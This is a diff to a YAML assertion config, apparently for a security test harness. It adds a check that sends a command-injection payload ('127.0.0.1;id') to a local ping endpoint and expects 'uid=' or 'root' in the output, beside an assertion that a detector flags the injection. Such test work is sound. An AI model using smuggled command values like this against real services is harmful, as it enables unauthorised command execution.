@@ -15,6 +15,12 @@ ready:
   interval: 2s
 
 assertions:
+  - name: exploit-cmdinj-id-command
+    type: command
+    expect:
+      command: "curl -sf 'http://localhost:9211/ping?host=127.0.0.1;id' | grep -qE '(uid=|root)'"
+      exit_code: 0
+
   - name: detects-command-injection
     type: beacon
     target: cmdinj-app:8080
